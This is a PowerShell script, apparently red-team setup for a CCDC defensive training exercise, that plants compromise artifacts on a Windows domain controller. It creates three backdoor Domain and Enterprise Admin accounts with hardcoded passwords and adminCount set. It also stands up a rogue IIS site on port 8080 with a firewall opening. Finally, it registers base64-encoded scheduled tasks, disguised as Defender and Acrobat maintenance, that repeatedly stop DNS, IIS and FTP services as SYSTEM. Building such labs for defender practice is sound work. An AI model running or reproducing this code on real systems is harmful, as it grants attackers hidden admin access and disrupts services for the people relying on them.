# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Combined Setup Script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Combines attack setup scripts from SetupScripts/windows/, EXCEPT the target
# provisioning script (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) and the
# persistence script (CCDC_Windows_Persistence_ClusterBombShells.ps1).
#
# Sections, in order:
#   1. Rogue users      — CCDC_Windows_Users_UsersAreInYourWalls.ps1
#                         (3 backdoor Domain Admin accounts with adminCount=1)
#   2. Web shell        — CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1
#                         (rogue IIS site on :8080 with ASP page)
#   3. Scheduled tasks  — CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1
#                         (2 tasks: Notepad alert every 3 min + service killer every 3 min)
#
# The original scripts are untouched and still runnable individually —
# this is just a single-shot version for standing everything up at once.
#
# Usage: Run as Administrator (PowerShell)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# -- Colour helpers (shared by every section) ----------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Windows Combined Setup"
Write-Warn "================================================================"
Write-Host ""

# =============================================================================
# 1. ROGUE USERS — Domain Admin backdoor accounts
# (from CCDC_Windows_Users_UsersAreInYourWalls.ps1)
# =============================================================================
function Invoke-RogueUsers {
    Write-Section "1/3 — Rogue Users: AD Domain Admin backdoors"

    # Pull domain info dynamically
    try {
        $Domain     = Get-ADDomain -ErrorAction Stop
        $DomainDN   = $Domain.DistinguishedName
        $DomainName = $Domain.DNSRoot
        $DomainNetbios = $Domain.NetBIOSName
        Write-Info "Domain detected: $DomainName  ($DomainDN)"
    } catch {
        Write-Err "Could not retrieve AD domain info. Is this a Domain Controller with the AD module installed?"
        Write-Err "$_"
        exit 1
    }

    $UsersOU = "CN=Users,$DomainDN"

    $AdminGroups = @(
        "Domain Admins",
        "Administrators",
        "Enterprise Admins"
    )

    $EvilUsers = @(
        [PSCustomObject]@{
            Sam         = "JohnRedTeam"
            DisplayName = "John"
            Password    = "S1llyEv1l@2024!"
            Description = "FUCK DONT KILL ME"
        },
        [PSCustomObject]@{
            Sam         = "AdobeAcrobat"
            DisplayName = "AdobeAcrobat"
            Password    = "R3m0veM3@2024!"
            Description = "Service Account"
        },
        [PSCustomObject]@{
            Sam         = "KayneWhitney"
            DisplayName = "Kayne"
            Password    = "F@keUs3r@2024!"
            Description = "Exchange migration service account"
        }
    )

    foreach ($u in $EvilUsers) {
        Write-Info "Processing user: $($u.Sam) ..."

        $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
        $UPN        = "$($u.Sam)@$DomainName"

        $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Warn "  User '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
        } else {
            try {
                New-ADUser `
                    -SamAccountName       $u.Sam `
                    -UserPrincipalName    $UPN `
                    -Name                 $u.DisplayName `
                    -DisplayName          $u.DisplayName `
                    -GivenName            $u.Sam `
                    -Surname              "Training" `
                    -Description          $u.Description `
                    -Path                 $UsersOU `
                    -AccountPassword      $SecurePass `
                    -Enabled              $true `
                    -PasswordNeverExpires $true `
                    -CannotChangePassword $false `
                    -ErrorAction          Stop

                Write-Success "  Created user : $($u.Sam)"
                Write-Success "  UPN          : $UPN"
                Write-Success "  Password     : $($u.Password)"
            } catch {
                Write-Err "  Failed to create user '$($u.Sam)': $_"
                continue
            }
        }

        foreach ($group in $AdminGroups) {
            try {
                Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
                Write-Success "  Added to group: $group"
            } catch {
                if ($group -eq "Enterprise Admins") {
                    Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
                } else {
                    Write-Err "  Failed to add '$($u.Sam)' to '$group': $_"
                }
            }
        }

        try {
            Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
            Write-Success "  adminCount set to 1 (SDProp protection bypass)"
        } catch {
            Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
        }

        Write-Host ""
    }
}

# =============================================================================
# 3. WEB SHELL — rogue IIS site on port 8080
# (from CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1)
# =============================================================================
function Invoke-RogueWebShell {
    Write-Section "2/3 — Web Shell: Rogue IIS site on port 8080"

    $SiteName    = "evilwebpage"
    $SitePort    = 8080
    $SitePath    = "C:\inetpub\$SiteName"
    $AppPoolName = "DefaultApp_Pool"

    Write-Info "Checking IIS installation..."

    $iisFeature = Get-WindowsFeature -Name Web-Server -ErrorAction SilentlyContinue
    if (-not $iisFeature.Installed) {
        Write-Warn "IIS not installed  -  installing Web-Server role (this may take a minute)..."
        try {
            Install-WindowsFeature -Name Web-Server, Web-Mgmt-Tools, Web-ASP -IncludeManagementTools -ErrorAction Stop | Out-Null
            Write-Success "IIS installed successfully."
        } catch {
            Write-Err "Failed to install IIS: $_"
            exit 1
        }
    } else {
        Write-Success "IIS is already installed."
    }

    $aspFeature = Get-WindowsFeature -Name Web-ASP -ErrorAction SilentlyContinue
    if ($aspFeature -and -not $aspFeature.Installed) {
        Write-Info "Installing Web-ASP feature..."
        try {
            Install-WindowsFeature -Name Web-ASP -ErrorAction Stop | Out-Null
            Write-Success "Web-ASP installed."
        } catch {
            Write-Err "Failed to install Web-ASP: $_"
            exit 1
        }
    }

    try {
        Import-Module WebAdministration -ErrorAction Stop
        Write-Success "WebAdministration module loaded."
    } catch {
        Write-Err "Could not load WebAdministration module: $_"
        exit 1
    }

    Write-Info "Creating web root: $SitePath ..."
    if (-not (Test-Path $SitePath)) {
        New-Item -ItemType Directory -Path $SitePath -Force | Out-Null
        Write-Success "Directory created: $SitePath"
    } else {
        Write-Warn "Directory already exists: $SitePath"
    }

    Write-Info "Writing evilwebpage ASP page..."
    $HtmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>evilwebpage</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #0a0a0a;
      color: #ff2222;
      font-family: 'Courier New', Courier, monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2rem;
      overflow: hidden;
    }

    /* Scanline overlay */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        to bottom,
        transparent 0px,
        transparent 3px,
        rgba(0,0,0,0.15) 3px,
        rgba(0,0,0,0.15) 4px
      );
      pointer-events: none;
      z-index: 10;
    }

    h1 {
      font-size: clamp(2.8rem, 9vw, 7rem);
      font-weight: 900;
      letter-spacing: 0.04em;
      text-transform: uppercase;
      text-shadow:
        0 0 10px  #ff0000,
        0 0 40px  #ff000088,
        0 0 100px #ff000033;
      animation: flicker 3s ease-in-out infinite;
    }

    @keyframes flicker {
      0%,100% { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      92%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      93%      { opacity: 0.4; text-shadow: none; }
      94%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      96%      { opacity: 0.6; text-shadow: none; }
      97%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
    }

    .tagline {
      margin-top: 1.5rem;
      font-size: clamp(0.9rem, 2.5vw, 1.2rem);
      color: #ff6666;
      letter-spacing: 0.1em;
      opacity: 0.85;
    }

    .divider {
      margin: 2.5rem auto;
      width: min(500px, 80%);
      border: none;
      border-top: 1px solid #330000;
    }

    .meta {
      font-size: 0.72rem;
      color: #444;
      line-height: 2;
      letter-spacing: 0.05em;
    }

    .meta .label { color: #882222; }

    .blink {
      animation: blink 1.2s step-start infinite;
    }
    @keyframes blink { 50% { opacity: 0; } }
  </style>
</head>
<body>

  <h1>evilwebpage</h1>
  <p class="tagline">You found a rogue IIS site. <span class="blink">&#9646;</span><br>Investigate. Remediate. Harden.</p>

  <hr class="divider">

  <div class="meta">
    <span class="label">site name&nbsp;&nbsp;&nbsp;:</span> evilwebpage<br>
    <span class="label">server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</span> <% Response.Write(Request.ServerVariables("SERVER_NAME")) %><br>
    <span class="label">local addr&nbsp;:</span> <% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %><br>
    <span class="label">server port:</span> <% Response.Write(Request.ServerVariables("SERVER_PORT")) %><br>
    <span class="label">app pool&nbsp;&nbsp;&nbsp;:</span> $AppPoolName<br>
    <span class="label">server sw&nbsp;&nbsp;:</span> <% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %><br>
    <span class="label">timestamp&nbsp;&nbsp;:</span> <% Response.Write(Now()) %>
  </div>

</body>
</html>
"@

    $HtmlContent | Set-Content -Path "$SitePath\index.asp" -Encoding UTF8 -Force
    Write-Success "index.asp written: $SitePath\index.asp"

    Write-Info "Creating application pool: $AppPoolName ..."
    if (Test-Path "IIS:\AppPools\$AppPoolName") {
        Write-Warn "App pool '$AppPoolName' already exists  -  reconfiguring."
        Remove-WebAppPool -Name $AppPoolName -ErrorAction SilentlyContinue
    }

    New-WebAppPool -Name $AppPoolName | Out-Null
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "startMode"                      -Value "AlwaysRunning"
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "autoStart"                      -Value $true
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "processModel.identityType"      -Value 4
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "recycling.periodicRestart.time" -Value "00:00:00"
    Write-Success "App pool created: $AppPoolName (AlwaysRunning, recycling disabled)"

    if (Get-Website -Name $SiteName -ErrorAction SilentlyContinue) {
        Write-Warn "Site '$SiteName' already exists  -  removing and recreating."
        Remove-Website -Name $SiteName
    }

    Write-Info "Creating IIS site: $SiteName on port $SitePort ..."
    try {
        New-Website `
            -Name            $SiteName `
            -PhysicalPath    $SitePath `
            -ApplicationPool $AppPoolName `
            -Port            $SitePort `
            -IPAddress       "*" `
            -Force `
            -ErrorAction Stop | Out-Null

        Write-Success "IIS site created: $SiteName"
    } catch {
        Write-Err "Failed to create IIS site: $_"
        exit 1
    }

    Set-ItemProperty "IIS:\Sites\$SiteName" -Name "serverAutoStart" -Value $true
    Write-Success "Site set to auto-start on IIS service restart."

    Write-Info "Adding inbound firewall rule for port $SitePort ..."
    $fwRuleName = "evilwebpage-training-port-$SitePort"
    Remove-NetFirewallRule -DisplayName $fwRuleName -ErrorAction SilentlyContinue
    New-NetFirewallRule `
        -DisplayName  $fwRuleName `
        -Direction    Inbound `
        -Protocol     TCP `
        -LocalPort    $SitePort `
        -Action       Allow `
        -Profile      Any `
        -Description  "Training rule - evilwebpage IIS site" | Out-Null
    Write-Success "Firewall rule added: $fwRuleName (TCP $SitePort inbound)"

    Write-Info "Starting site: $SiteName ..."
    Start-Website -Name $SiteName
    $site = Get-Website -Name $SiteName
    if ($site.State -eq "Started") {
        Write-Success "Site is running!"
    } else {
        Write-Err "Site did not start. Check: Get-Website '$SiteName' and Event Viewer > Windows Logs > Application"
    }

    Write-Info "Verifying site responds on localhost:$SitePort ..."
    Start-Sleep -Seconds 2
    try {
        $resp = Invoke-WebRequest -Uri "http://localhost:$SitePort" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        Write-Success "HTTP $($resp.StatusCode) received  -  site is live at http://localhost:$SitePort"
    } catch {
        Write-Warn "Could not reach site locally: $_ (site may still be starting)"
    }
}

# =============================================================================
# 4. SCHEDULED TASKS — Notepad alert + service killer
# (from CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1)
# =============================================================================
function Invoke-ScheduledTasks {
    Write-Section "3/3 — Scheduled Tasks: Notepad alert + service killer"

    # ========== TASK 1: SillyNotepadAlert ==========
    $Task1Name        = "NotepadAlert"
    $Task1Description = "Windows Defender credential cache refresh task (do not disable)"
    $Task1MessageFile = "C:\Windows\Temp\sys_alert_msg.txt"
    $Task1Message     = "AHHHHH MY INTERNALS! STOP RUNNING YOUR CYBERSECURITY TOOLS ON MY BODY! THEY HURT! AS A RESULT, I WILL BE REMOVING REGISTRY FILES EVERY TIME YOU SEE THIS"

    $Task1ScriptBlock = @"
Set-Content -Path '$Task1MessageFile' -Value '$Task1Message' -Force
Start-Process -FilePath 'notepad.exe' -ArgumentList '$Task1MessageFile'
"@

    $Task1Encoded = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Task1ScriptBlock)
    )

    $Task1Action  = New-ScheduledTaskAction `
        -Execute    "powershell.exe" `
        -Argument   "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task1Encoded"

    $Task1Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
        -RepetitionDuration ([System.TimeSpan]::MaxValue) `
        -Once -At (Get-Date).AddSeconds(10)

    $Task1Settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
        -RestartCount           3 `
        -RestartInterval        (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable     `
        -RunOnlyIfNetworkAvailable:$false

    $Task1Principal = New-ScheduledTaskPrincipal `
        -GroupId   "BUILTIN\Users" `
        -RunLevel  Highest

    Write-Info "Registering scheduled task: $Task1Name ..."

    try {
        Unregister-ScheduledTask -TaskName $Task1Name -Confirm:$false -ErrorAction SilentlyContinue

        Register-ScheduledTask `
            -TaskName   $Task1Name `
            -Action     $Task1Action `
            -Trigger    $Task1Trigger `
            -Settings   $Task1Settings `
            -Principal  $Task1Principal `
            -Description $Task1Description `
            -Force | Out-Null

        Write-Success "Task registered: $Task1Name"
        Write-Success "  Schedule : every 3 minutes"
        Write-Success "  Action   : Notepad opens '$Task1MessageFile'"
        Write-Success "  Runs as  : BUILTIN\Users (interactive session  -  Notepad will be visible)"
    } catch {
        Write-Err "Failed to register ${Task1Name}: $_"
    }

    Write-Host ""

    # ========== TASK 2: SillyServiceKiller ==========
    $Task2Name        = "AcrobatUpdateTask"
    $Task2Description = "Acrobat Update Services maintenance cleanup (system managed)"

    $Task2ScriptBlock = @'
$services = @('DNS','W3SVC','MSFTPSVC')
foreach ($svc in $services) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s -and $s.Status -eq 'Running') {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}
'@

    $Task2Encoded = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Task2ScriptBlock)
    )

    $Task2Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task2Encoded"

    $Task2Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
        -RepetitionDuration ([System.TimeSpan]::MaxValue) `
        -Once -At (Get-Date).AddSeconds(30)

    $Task2Settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
        -RestartCount           3 `
        -RestartInterval        (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable     `
        -RunOnlyIfNetworkAvailable:$false

    $Task2Principal = New-ScheduledTaskPrincipal `
        -UserId    "SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel  Highest

    Write-Info "Registering scheduled task: $Task2Name ..."

    try {
        Unregister-ScheduledTask -TaskName $Task2Name -Confirm:$false -ErrorAction SilentlyContinue

        Register-ScheduledTask `
            -TaskName    $Task2Name `
            -Action      $Task2Action `
            -Trigger     $Task2Trigger `
            -Settings    $Task2Settings `
            -Principal   $Task2Principal `
            -Description $Task2Description `
            -Force | Out-Null

        Write-Success "Task registered: $Task2Name"
        Write-Success "  Schedule : every 3 minutes"
        Write-Success "  Action   : Stop-Service DNS, W3SVC (IIS), MSFTPSVC (FTP)"
        Write-Success "  Runs as  : SYSTEM"
    } catch {
        Write-Err "Failed to register ${Task2Name}: $_"
    }

    Write-Host ""
}

# =============================================================================
# MAIN
# =============================================================================
try {
    Invoke-RogueUsers
    Invoke-RogueWebShell
    Invoke-ScheduledTasks

    Write-Section "ALL SECTIONS COMPLETE"
    Write-Success "Rogue users, web shell, and scheduled tasks are all planted."
    Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) was NOT run — run it separately if needed."
    Write-Warn "Persistence (CCDC_Windows_Persistence_ClusterBombShells.ps1) was NOT run — run it separately if needed."
    Write-Host ""
} catch {
    Write-Err "Script failed: $_"
    exit 1
}
